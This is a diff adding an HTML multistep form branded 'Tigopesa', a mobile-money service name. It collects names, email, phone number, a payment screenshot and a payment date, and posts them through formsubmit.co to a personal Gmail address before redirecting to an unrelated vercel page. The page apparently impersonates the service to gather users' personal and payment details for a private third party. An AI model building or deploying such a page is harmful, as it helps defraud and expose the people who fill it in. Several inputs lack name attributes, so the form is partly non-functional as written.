@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Multistep form</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    @import url("https://fonts.googleapis.com/css?family=Poppins:400,500,600,700&display=swap");
+* {
+    margin: 0;
+    padding: 0;
+    outline: none;
+    font-family: "Poppins", sans-serif;
+}
+:root {
+    --primary: #f05525;
+    --secondary: #333;
+    --errorColor: red;
+    --stepNumber: 6;
+    --containerWidth: 600px;
+    --bgColor: #333;
+    --inputBorderColor: lightgray;
+}
+
+body {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    overflow-x: hidden;
+    background: black;
+}
+::selection {
+    color: #fff;
+    background: var(--primary);
+}
+.container {
+    width: 300px;
+    height: 600px;
+    background:#ffc310;
+    text-align: center;
+    border-radius: 10px;
+    padding: 50px 35px 10px 35px;
+}
+.container header {
+    font-size: 39px;
+    font-weight: 600;
+    margin: 0 0 30px 0;
+    color: #021c7c;
+}
+.container .form-outer {
+    width: 100%;
+    overflow: hidden;
+}
+.container .form-outer form {
+    display: flex;
+    width: calc(100% * var(--stepNumber));
+}
+.form-outer form .page {
+    width: calc(100% / var(--stepNumber));
+    transition: margin-left 0.3s ease-in-out;
+}
+.form-outer form .page .title {
+    text-align: left;
+    font-size: 25px;
+    font-weight: 500;
+    color: white;
+}
+.form-outer form .page .field {
+    width: 100%;
+    height: 45px;
+    margin: 45px 0;
+    display: flex;
+    position: relative;
+}
+form .page .field .label {
+    position: absolute;
+    top: -30px;
+    font-weight: 500;
+    color: #021c7c;
+    
+}
+form .page .field input {
+    box-sizing: border-box;
+    height: 100%;
+    width: 100%;
+    border: 1px solid var(--inputBorderColor);
+    border-radius: 5px;
+    padding-left: 15px;
+    margin: 0 1px;
+    font-size: 18px;
+    transition: border-color 150ms ease;
+}
+form .page .field input.invalid-input {
+    border-color: var(--errorColor);
+}
+form .page .field select {
+    width: 100%;
+    padding-left: 10px;
+    font-size: 17px;
+    font-weight: 500;
+}
+form .page .field button {
+    width: 100%;
+    height: calc(100% + 5px);
+    border: none;
+    background:white;
+    margin-top: -20px;
+    border-radius: 5px;
+    color: #021c7c;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 20px;
+    font-weight: 500;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    transition: 0.5s ease;
+}
+form .page .field button:hover {
+    background: gold;
+    
+}
+form .page .btns button {
+    margin-top: -20px !important;
+}
+form .page .btns button.prev {
+    margin-right: 3px;
+    font-size: 17px;
+}
+form .page .btns button.next {
+    margin-left: 3px;
+}
+.container .progress-bar{
+  display: flex;
+  margin: 40px 0 ;
+  user-select: none;
+}
+.container .progress-bar .step{
+  text-align: center;
+  width: 100%;
+  position: relative;
+}
+.container .progress-bar .step p{
+  font-weight: 500;
+  font-size: 15px;
+  color: #021c7c;
+  margin-bottom: 8px;
+}
+.progress-bar .step .bullet{
+  height: 25px;
+  width: 25px;
+  border: 2px solid white;
+  display: inline-block;
+  border-radius: 50%;
+  position: relative;
+  transition: 0.2s;
+  font-weight: 500;
+  font-size: 17px;
+  line-height: 25px;
+}
+.progress-bar .step .bullet.active{
+  border-color: black;
+  background: #021c7c;
+}
+.progress-bar .step .bullet span{
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+}
+.progress-bar .step .bullet.active span{
+  display: none;
+}
+.progress-bar .step .bullet:before,
+.progress-bar .step .bullet:after{
+  position: absolute;
+  content: '';
+  bottom: 11px;
+  right: -50px;
+  height: 3px;
+  width: 49px;
+  background: white;
+
+  
+}
+.progress-bar .step .bullet.active:after{
+  background: #021c7c;
+  transform: scaleX(0);
+  transform-origin: left;
+  animation: animate 0.3s linear forwards;
+}
+@keyframes animate {
+  100%{
+    transform: scaleX(1);
+  }
+}
+.progress-bar .step:last-child .bullet:before,
+.progress-bar .step:last-child .bullet:after{
+  display: none;
+}
+.progress-bar .step p.active{
+  color: white;
+  transition: 0.2s linear;
+}
+.progress-bar .step .check{
+  position: absolute;
+  left: 50%;
+  top: 70%;
+  font-size: 15px;
+  transform: translate(-50%, -50%);
+  display: none;
+}
+.progress-bar .step .check.active{
+  display: block;
+  color: #fff;
+}
+
+/*hii ya computer size screen*/
+
+@media screen and (min-width: 480px) {
+
+    .container {
+        box-sizing: border-box;
+        border-radius: 8px;
+        width: 377px;
+        height: 600px;
+    }
+}
+
+
+.custom-file-upload {
+    border: 1px solid #ccc;
+    display: inline-block;
+    cursor: pointer;
+      height: 100%;
+  width: 100%;
+  border: 1px solid lightgrey;
+  border-radius: 5px;
+  padding-left: 15px;
+  font-size: 18px;
+}
+
+input[type="file"] {
+    display: none;
+}
+
+
+
+
+.calendar {
+    position: absolute;
+    display: none;
+    /* Other styles for the calendar */
+}
+
+
+.custom-file-upload {
+    color: #999; /* Placeholder text color */
+}
+
+
+
+.custom-file-upload::before {
+    content: attr(placeholder);
+    color: inherit;
+    position: absolute;
+    left: 0;
+    top: 50%;
+    transform: translateY(-50%);
+}
+/* Hide the label when the input field is not empty */
+input[type="file"]:not(:placeholder-shown) + .custom-file-upload::before {
+    display: none;
+}
+
+
+.custom-file-upload-placeholder {
+    position: absolute;
+    left: 10px; /* Adjust this value to control the horizontal position */
+    top: 50%;
+    transform: translateY(-50%);
+    color: #999; /* Placeholder text color */
+    pointer-events: none; /* Ensure the label doesn't interfere with clicking the input */
+}
+
+input[type="file"] {
+    position: relative;
+    z-index: 1;
+    opacity: 0;
+}
+
+
+
+.labeljay {
+    font-size: 20px;
+    margin-bottom: 20px; /* Adjust spacing between label and textarea */
+    text-align: left;
+
+  
+}
+
+textarea {
+
+    width: 90%;
+    height: 150px; /* Adjust height as needed */
+    font-size: 16px;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 9px;
+    resize: vertical; /* Allows users to resize the textarea vertically */
+}
+
+
+
+
+  </style>
+    <body>
+        <div class="container">
+            <header>Tigopesa </header>
+         <div class="progress-bar">
+            <div class="step">
+               <p>
+                  Name
+               </p>
+               <div class="bullet">
+                  <span>1</span>
+               </div>
+               <div class="check fas fa-check"></div>
+            </div>
+            <div class="step">
+               <p>
+                  Contact
+               </p>
+               <div class="bullet">
+                  <span>2</span>
+               </div>
+               <div class="check fas fa-check"></div>
+            </div>
+            <div class="step">
+               <p>
+                  Upload
+               </p>
+               <div class="bullet">
+                  <span>3</span>
+               </div>
+               <div class="check fas fa-check"></div>
+            </div>
+            <div class="step">
+               <p>
+                  Submit
+               </p>
+               <div class="bullet">
+                  <span>4</span>
+               </div>
+               <div class="check fas fa-check"></div>
+            </div>
+         </div>
+            <div class="form-outer">
+              
+              
+<form method="POST" action="https://formsubmit.co/Kelvinarts55@gmail.com" enctype="multipart/form-data">
+           <div class="page slide-page">
+                  <div class="title">
+                     Phone Number Name:
+                  </div>
+                  <div class="field">
+                     <div class="label">
+                        First Name
+                     </div>
+<input type="text" placeholder="Enter your first name" required>
+                  </div>
+                  <div class="field">
+                     <div class="label">
+                        Last Name
+                     </div>
+                     <input type="text" placeholder="Enter your last name" required>
+                  </div>
+                  <div class="field">
+                     <button class="firstNext next">Next</button>
+                  </div>
+               </div>
+               <div class="page">
+                  <div class="title">
+                     Contact Info:
+                  </div>
+<div class="field">
+    <div class="label">
+        Email Address
+    </div>
+    <input type="text" placeholder="Enter your email address" required>
+</div>
+<div class="field">
+    <div class="label">
+        Phone Number
+    </div>
+    <input type="number" placeholder="Enter your phone number" required>
+</div>
+                  <div class="field btns">
+                     <button class="prev-1 prev">Previous</button>
+                     <button class="next-1 next">Next</button>
+                  </div>
+               </div>
+               <div class="page">
+                  <div class="title">
+                     Payment Screenshot:
+                  </div>
+<div class="field">
+    <div class="label">
+        Screenshot
+    </div>
+    <label for="screenshot-upload" class="custom-file-upload">
+        <span style="position: relative; left: -60px; top:20%;color:#757575;">Attach Screenshot</span>
+    </label>
+    <input id="screenshot-upload" type="file" required>
+</div>
+               <div class="field">
+    <div class="label" id="dob-label">
+        Payment Date
+    </div>
+    <input id="datepicker-input" type="text" placeholder="Select Date" required>
+    <div id="calendar" class="calendar">
+        <!-- Calendar content will be generated here -->
+    </div>
+</div>
+                  <div class="field btns">
+                     <button class="prev-2 prev">Previous</button>
+                     <button class="next-2 next">Next</button>
+                  </div>
+               </div>
+               
+               
+               <div class="page">
+                  <div class="title">
+                     Message:
+                  </div>
+<div class="fieldjay" style="margin-top: 20px;">
+    <textarea placeholder="Enter a message or leave blank"></textarea>
+</div>
+
+
+                  <div class="field btns">
+                     <button class="prev-3 prev">Previous</button>
+                     <button class="submit">Submit</button>
+                  </div>
+               </div>
+               
+                    <input type="hidden" name="_template" value="table">
+<input type="hidden" name="_subject" value="New submission!">
+
+<input type="hidden" name="_next" value="https://safiridigital-icu-thankpage.vercel.app/">
+<input type="hidden" name="_cc" value="another@email.com">
+<input type="hidden" name="_autoresponse" value="your custom message">
+  
+  
+  
+  
+               
+                </form>
+            </div>
+        </div>
+    </body>
+</html>
+
+
+
+
+<!-- calender js -->
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const datepicker = document.getElementById('datepicker-input');
+        const calendar = document.getElementById('calendar');
+
+        datepicker.addEventListener("focus", function() {
+            const currentDate = new Date();
+            const year = currentDate.getFullYear();
+            const month = currentDate.getMonth() + 1;
+            const day = currentDate.getDate();
+            const formattedDate = year + "-" + (month < 10 ? "0" : "") + month + "-" + (day < 10 ? "0" : "") + day;
+            
+            datepicker.value = formattedDate;
+        });
+
+        calendar.addEventListener("click", function(event) {
+            if (event.target.classList.contains("date-option")) {
+                datepicker.value = event.target.textContent;
+                calendar.style.display = "none";
+            }
+        });
+    });
+</script>
+
+
+
+
+
+<!-- partial -->
+  <script>
+    initMultiStepForm();
+
+function initMultiStepForm() {
+    const progressNumber = document.querySelectorAll(".step").length;
+    const slidePage = document.querySelector(".slide-page");
+    const submitBtn = document.querySelector(".submit");
+    const progressText = document.querySelectorAll(".step p");
+    const progressCheck = document.querySelectorAll(".step .check");
+    const bullet = document.querySelectorAll(".step .bullet");
+    const pages = document.querySelectorAll(".page");
+    const nextButtons = document.querySelectorAll(".next");
+    const prevButtons = document.querySelectorAll(".prev");
+    const stepsNumber = pages.length;
+
+    if (progressNumber !== stepsNumber) {
+        console.warn(
+            "Error, number of steps in progress bar do not match number of pages"
+        );
+    }
+
+    document.documentElement.style.setProperty("--stepNumber", stepsNumber);
+
+    let current = 1;
+
+    for (let i = 0; i < nextButtons.length; i++) {
+        nextButtons[i].addEventListener("click", function (event) {
+            event.preventDefault();
+
+            inputsValid = validateInputs(this);
+            // inputsValid = true;
+
+            if (inputsValid) {
+                slidePage.style.marginLeft = `-${
+                    (100 / stepsNumber) * current
+                }%`;
+                bullet[current - 1].classList.add("active");
+                progressCheck[current - 1].classList.add("active");
+                progressText[current - 1].classList.add("active");
+                current += 1;
+            }
+        });
+    }
+
+    for (let i = 0; i < prevButtons.length; i++) {
+        prevButtons[i].addEventListener("click", function (event) {
+            event.preventDefault();
+            slidePage.style.marginLeft = `-${
+                (100 / stepsNumber) * (current - 2)
+            }%`;
+            bullet[current - 2].classList.remove("active");
+            progressCheck[current - 2].classList.remove("active");
+            progressText[current - 2].classList.remove("active");
+            current -= 1;
+        });
+    }
+    submitBtn.addEventListener("click", function () {
+        bullet[current - 1].classList.add("active");
+        progressCheck[current - 1].classList.add("active");
+        progressText[current - 1].classList.add("active");
+        current += 1;
+        setTimeout(function () {
+            alert("Your Form Successfully Signed up");
+            location.reload();
+        }, 800);
+    });
+
+    function validateInputs(ths) {
+        let inputsValid = true;
+
+        const inputs =
+            ths.parentElement.parentElement.querySelectorAll("input");
+        for (let i = 0; i < inputs.length; i++) {
+            const valid = inputs[i].checkValidity();
+            if (!valid) {
+                inputsValid = false;
+                inputs[i].classList.add("invalid-input");
+            } else {
+                inputs[i].classList.remove("invalid-input");
+            }
+        }
+        return inputsValid;
+    }
+}
+  </script>
+
+
+
+
+</body>
+</html>
